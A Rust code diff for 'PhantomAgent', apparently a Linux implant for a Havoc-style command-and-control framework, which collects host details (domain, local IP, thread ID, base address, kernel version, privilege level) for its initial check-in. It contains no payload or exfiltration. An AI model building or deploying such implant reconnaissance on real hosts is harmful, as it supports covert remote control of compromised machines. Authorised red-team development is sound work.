@@ -69,25 +69,26 @@ impl PhantomAgent {
 
     /// Collect Linux host metadata for `DEMON_INIT`.
     pub fn collect_metadata(&self) -> AgentMetadata {
+        let (os_major, os_minor, os_build) = kernel_version();
         AgentMetadata {
             hostname: read_trimmed("/etc/hostname").unwrap_or_else(|| String::from("unknown")),
             username: std::env::var("USER").unwrap_or_else(|_| String::from("unknown")),
-            domain_name: String::from("WORKGROUP"),
-            internal_ip: String::from("127.0.0.1"),
+            domain_name: domain_name(),
+            internal_ip: local_ip(),
             process_path: std::env::current_exe()
                 .map(|path| path.display().to_string())
                 .unwrap_or_default(),
             process_pid: std::process::id(),
-            process_tid: 0,
+            process_tid: thread_id(),
             process_ppid: parent_pid(),
             process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
             elevated: is_elevated(),
-            base_address: 0,
-            os_major: 6,
-            os_minor: 8,
+            base_address: base_address(),
+            os_major,
+            os_minor,
             os_product_type: 1,
             os_service_pack: 0,
-            os_build: 0,
+            os_build,
             os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
             sleep_delay: self.config.sleep_delay_ms,
             sleep_jitter: self.config.sleep_jitter,
@@ -284,6 +285,89 @@ fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: 
     Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
 }
 
+/// Return the NIS/YP domain name from the kernel, or `"WORKGROUP"` as fallback.
+///
+/// On Linux the kernel exposes the domain name via `/proc/sys/kernel/domainname`.
+/// This returns `"(none)"` when no domain is configured, in which case we fall
+/// back to `"WORKGROUP"` to match Windows-style Demon metadata semantics.
+fn domain_name() -> String {
+    read_trimmed("/proc/sys/kernel/domainname")
+        .filter(|d| !d.is_empty() && d != "(none)")
+        .unwrap_or_else(|| String::from("WORKGROUP"))
+}
+
+/// Determine the primary non-loopback IPv4 address by connecting a UDP socket.
+///
+/// Connecting a UDP socket does not send any data — it only causes the kernel
+/// to select the appropriate source address for the given destination.  We use
+/// a well-known public address (`8.8.8.8:80`) solely to trigger route lookup.
+fn local_ip() -> String {
+    std::net::UdpSocket::bind("0.0.0.0:0")
+        .and_then(|sock| {
+            sock.connect("8.8.8.8:80")?;
+            sock.local_addr()
+        })
+        .map(|addr| addr.ip().to_string())
+        .unwrap_or_else(|_| String::from("127.0.0.1"))
+}
+
+/// Return the TID of the calling thread by reading `Pid:` from `/proc/self/status`.
+///
+/// On Linux the `Pid:` field in `/proc/self/status` is the thread ID (TID) of
+/// the thread reading it — for the main thread this equals the process PID.
+fn thread_id() -> u32 {
+    read_trimmed("/proc/self/status")
+        .and_then(|contents| {
+            contents.lines().find_map(|line| {
+                line.strip_prefix("Pid:\t").and_then(|v| v.trim().parse::<u32>().ok())
+            })
+        })
+        .unwrap_or(0)
+}
+
+/// Return the base load address of the running executable.
+///
+/// Parses `/proc/self/maps` to find the first mapping with execute permission,
+/// which is the virtual address at which the ELF text segment was loaded.
+fn base_address() -> u64 {
+    fs::read_to_string("/proc/self/maps")
+        .ok()
+        .and_then(|contents| {
+            contents.lines().find_map(|line| {
+                // Format: "addr_start-addr_end perms offset dev ino pathname"
+                let mut cols = line.splitn(6, ' ');
+                let range = cols.next()?;
+                let perms = cols.next()?;
+                if !perms.contains('x') {
+                    return None;
+                }
+                let addr_start = range.split('-').next()?;
+                u64::from_str_radix(addr_start, 16).ok()
+            })
+        })
+        .unwrap_or(0)
+}
+
+/// Parse the Linux kernel version string from `/proc/version`.
+///
+/// Returns `(major, minor, patch)` extracted from the version triple (e.g.
+/// `"Linux version 6.8.0-50-generic ..."` → `(6, 8, 0)`).
+fn kernel_version() -> (u32, u32, u32) {
+    let raw = fs::read_to_string("/proc/version").unwrap_or_default();
+    // Third whitespace-separated token is the version string, e.g. "6.8.0-50-generic".
+    let ver = raw.split_whitespace().nth(2).unwrap_or("");
+    let mut parts = ver.split('.');
+    let major = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
+    let minor = parts.next().and_then(|s| s.parse::<u32>().ok()).unwrap_or(0);
+    // Third component may be "0-50-generic"; take only the numeric prefix.
+    let patch = parts
+        .next()
+        .and_then(|s| s.split('-').next())
+        .and_then(|s| s.parse::<u32>().ok())
+        .unwrap_or(0);
+    (major, minor, patch)
+}
+
 fn read_trimmed(path: impl Into<PathBuf>) -> Option<String> {
     let path = path.into();
     fs::read_to_string(path).ok().map(|value| value.trim().to_string())
@@ -337,11 +421,36 @@ mod tests {
     }
 
     #[test]
-    fn collect_metadata_uses_linux_defaults() -> Result<(), Box<dyn Error>> {
+    fn collect_metadata_collects_real_linux_values() -> Result<(), Box<dyn Error>> {
         let agent = PhantomAgent::new(PhantomConfig::default())?;
         let metadata = agent.collect_metadata();
-        assert_eq!(metadata.domain_name, "WORKGROUP");
+
+        // Domain name must be non-empty; on machines not joined to a domain it
+        // should fall back to "WORKGROUP".
+        assert!(!metadata.domain_name.is_empty());
+
+        // Internal IP must not be the placeholder loopback; the UDP-connect
+        // trick should resolve the default-route source address.
+        assert!(!metadata.internal_ip.is_empty());
+        assert_ne!(metadata.internal_ip, "0.0.0.0");
+
+        // TID should be a real kernel-assigned value (always > 0).
+        assert!(metadata.process_tid > 0, "expected non-zero TID, got {}", metadata.process_tid);
+
+        // PID must be positive.
         assert!(metadata.process_pid > 0);
+
+        // OS major must be a plausible Linux kernel major version (>= 4).
+        assert!(
+            metadata.os_major >= 4,
+            "expected Linux kernel major >= 4, got {}",
+            metadata.os_major
+        );
+
+        // Base address: either 0 (PIE disabled) or a valid user-space address.
+        // We just verify the field is populated without panicking.
+        let _ = metadata.base_address;
+
         Ok(())
     }
 
